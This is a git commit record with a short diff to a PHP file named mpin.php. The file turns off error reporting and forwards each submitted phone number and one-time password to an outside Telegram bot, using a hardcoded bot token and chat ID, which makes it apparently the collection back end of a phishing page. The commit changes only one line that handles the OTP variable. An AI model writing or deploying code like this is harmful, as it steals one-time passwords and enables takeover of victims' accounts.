c858328ae92d993f8b8550310ad7ba6a928045cb
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-04 10:51:31 +0000

    Create mpin.php

--- mpin.php
+++ mpin.php
@@ -2,4 +2,4 @@ error_reporting(0);
 error_log(0);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number'] . " OTP: " . $_POST['otp']);
 
-// $otp = $_POST['otp'] + 1;
+$otp = null;
